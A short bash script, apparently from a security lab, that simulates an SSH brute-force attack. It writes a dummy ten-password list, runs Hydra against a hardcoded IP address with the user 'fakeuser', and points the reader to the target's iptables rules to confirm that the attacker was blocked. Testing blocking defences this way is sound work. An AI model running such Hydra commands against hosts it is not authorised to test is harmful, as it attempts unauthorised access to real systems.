#!/bin/bash
# SSH Brute-force Simulation script
# Run this from the Attacker Server to simulate an SSH brute-force attack
# Target IP: 20.24.64.56 (Target Server)

TARGET_IP="20.24.64.56"
PASS_FILE="/tmp/passwords.txt"

echo "=== Creating wordlist at $PASS_FILE ==="
echo -e "salah1\nsalah2\nsalah3\nsalah4\nsalah5\nsalah6\nsalah7\nsalah8\nsalah9\nsalah10" > $PASS_FILE

echo "=== Launching Hydra Brute-force on target $TARGET_IP ==="
hydra -l fakeuser -P $PASS_FILE ssh://$TARGET_IP -t 4

echo "Hydra execution completed or timed out (due to blocking)."
echo "Check target server with 'sudo iptables -L INPUT -n' to see if attacker IP has been blocked."
